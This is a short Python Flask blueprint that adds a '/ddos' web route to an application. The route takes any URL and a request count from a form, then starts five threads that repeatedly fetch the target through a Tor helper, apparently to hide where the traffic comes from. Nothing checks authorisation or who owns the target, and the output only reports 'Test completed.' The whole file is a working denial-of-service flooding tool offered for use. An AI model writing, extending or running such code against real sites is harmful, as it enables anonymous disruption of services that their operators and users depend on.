from flask import Blueprint, request, render_template
import tor_utils
import threading

ddos_bp = Blueprint('ddos', __name__, template_folder='templates')

def ddos_thread(url, count):
    for _ in range(count):
        tor_utils.safe_get(url)

@ddos_bp.route('/ddos', methods=['GET', 'POST'])
def ddos():
    result = "Test completed."
    if request.method == 'POST':
        url = request.form.get('url')
        count = int(request.form.get('count', 10))
        threads = []
        for _ in range(5):
            t = threading.Thread(target=ddos_thread, args=(url, count))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
    return render_template('ddos.html', result=result)